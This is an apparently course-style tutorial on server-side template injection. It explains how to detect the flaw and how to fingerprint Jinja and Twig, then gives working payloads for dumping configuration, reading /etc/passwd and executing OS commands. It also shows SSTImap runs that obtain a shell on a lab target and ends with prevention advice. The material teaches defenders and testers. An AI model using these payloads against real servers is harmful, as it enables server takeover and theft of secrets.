# Identifying SSTI
## Confirming SSTI

The process of identifying an SSTI vulnerability is similar to the process of identifying any other injection vulnerability, such as SQL injection. The most effective way is to inject special characters with semantic meaning in template engines and observe the web application's behavior. As such, the following test string is commonly used to provoke an error message in a web application vulnerable to SSTI, as it consists of all special characters that have a particular semantic purpose in popular template engines:

```
${{<%[%'"}}%\.
```

Since the above test string should almost certainly violate the template syntax, it should result in an error if the web application is vulnerable to SSTI. This behavior is similar to how injecting a single quote (`'`) into a web application vulnerable to SQL injection can break an SQL query's syntax and thus result in an SQL error.

As a practical example, let us look at our sample web application. We can insert a name, which is then reflected on the following page:

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_identification_1.png)

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_identification_2.png)

To test for an SSTI vulnerability, we can inject the above test string. This results in the following response from the web application:

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_identification_3.png)

As we can see, the web application throws an error. While this does not confirm that the web application is vulnerable to SSTI, it should increase our suspicion that the parameter might be vulnerable.

---

## Identifying the Template Engine

To enable the successful exploitation of an SSTI vulnerability, we first need to determine the template engine used by the web application. We can utilize slight variations in the behavior of different template engines to achieve this. For instance, consider the following commonly used overview containing slight differences in popular template engines:

![image](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)

We will start by injecting the payload `${7*7}` and follow the diagram from left to right, depending on the result of the injection. Suppose the injection resulted in a successful execution of the injected payload. In that case, we follow the green arrow; otherwise, we follow the red arrow until we arrive at a resulting template engine.

Injecting the payload `${7*7}` into our sample web application results in the following behavior:

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_identification_4.png)

Since the injected payload was not executed, we follow the red arrow and now inject the payload `{{7*7}}`:

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_identification_5.png)

This time, the payload was executed by the template engine. Therefore, we follow the green arrow and inject the payload `{{7*'7'}}`. The result will enable us to deduce the template engine used by the web application. In Jinja, the result will be `7777777`, while in Twig, the result will be `49`.

# Exploiting Jinja
## Information Disclosure

We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. For instance, we can obtain the web application's configuration using the following SSTI payload:

Code: jinja2

```jinja2
{{ config.items() }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_1.png)

Since this payload dumps the entire web application configuration, including any used secret keys, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions:

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_2.png)

---

## Local File Inclusion (LFI)

We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_3.png)

---

## Remote Code Execution (RCE)

To achieve remote code execution in Python, we can use functions provided by the `os` library, such as `system` or `popen`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`. This results in the following SSTI payload:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_4.png)

# Exploiting SSTI - Twig

---

In this section, we will explore another example of SSTI exploitation. In the previous section, we discussed exploiting SSTI in the `Jinja` template engine. This section will discuss exploiting SSTI in the `Twig` template engine. Like in the previous section, we will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step. Twig is a template engine for the PHP programming language.

---

## Information Disclosure

In Twig, we can use the `_self` keyword to obtain a little information about the current template:

Code: twig

```twig
{{ _self }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_2_1.png)

However, as we can see, the amount of information is limited compared to `Jinja`.

---

## Local File Inclusion (LFI)

Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:

Code: twig

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_3.png)

---

## Remote Code Execution (RCE)

To achieve remote code execution, we can use a PHP built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:

Code: twig

```twig
{{ ['id'] | filter('system') }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_2_3.png)

---

## Further Remarks

This module explored exploiting SSTI in the `Jinja` and `Twig` template engines. As we have seen, the syntax of each template engine is slightly different. However, the general idea behind SSTI exploitation remains the same. Therefore, exploiting an SSTI in a template engine the attacker is unfamiliar with is often as simple as becoming familiar with the syntax and supported features of that particular template engine. An attacker can achieve this by reading the template engine's documentation. However, there are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).


# SSTI Tools of the Trade & Preventing SSTI

---

This section will showcase tools that can help us identify and exploit SSTI vulnerabilities. Furthermore, we will briefly explore how to prevent these vulnerabilities.

---

## Tools of the Trade

The most popular tool for identifying and exploiting SSTI vulnerabilities is [tplmap](https://github.com/epinna/tplmap). However, tplmap is not maintained anymore and runs on the deprecated Python2 version. Therefore, we will use the more modern [SSTImap](https://github.com/vladko312/SSTImap) to aid the SSTI exploitation process. We can run it after cloning the repository and installing the required dependencies:

```shell-session
[!bash!]$ git clone https://github.com/vladko312/SSTImap

[!bash!]$ cd SSTImap

[!bash!]$ pip3 install -r requirements.txt

[!bash!]$ python3 sstimap.py 

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗ ║ ║ ║{║ _ __ ___ __ _ _ __
    ╚════╗ ╠════╗ ║ ║ ║ ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║ ║ ║ ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝ ╚═╝ ╚╦╝ |_| |_| |_|\__,_| .__/
                             │ | |
                                                |_|
[*] Version: 1.2.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state, and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2
[*] Loaded request body types: 4
[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```

To automatically identify any SSTI vulnerabilities as well as the template engine used by the web application, we need to provide SSTImap with the target URL:

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test

<SNIP>

[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

As we can see, SSTImap confirms the SSTI vulnerability and successfully identifies the `Twig` template engine. It also provides capabilities we can use during exploitation. For instance, we can download a remote file to our local machine using the `-D` flag:

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

<SNIP>

[+] File downloaded correctly
```

Additionally, we can execute a system command using the `-S` flag:

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

<SNIP>

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Alternatively, we can use `--os-shell` to obtain an interactive shell:

```shell-session
[!bash!]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell

<SNIP>

[+] Run commands on the operating system.
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux $ whoami
www-data
```

---

## Prevention

To prevent SSTI vulnerabilities, we must ensure that user input is never fed into the call to the template engine's rendering function in the template parameter. This can be achieved by carefully going through the different code paths and ensuring that user input is never added to a template before a call to the rendering function.

Suppose a web application intends to have users modify existing templates or upload new ones for business reasons. In that case, it is crucial to implement proper hardening measures to prevent the takeover of the web server. This process can include hardening the template engine by removing potentially dangerous functions that can be used to achieve remote code execution from the execution environment. Removing dangerous functions prevents attackers from using these functions in their payloads. However, this technique is prone to bypasses. A better approach would be to separate the execution environment in which the template engine runs entirely from the web server, for instance, by setting up a separate execution environment such as a Docker container.

# Bypassing
https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9

https://medium.com/stolabs/ssti-vulnerability-server-side-template-injection-execution-and-exploration-286923651032
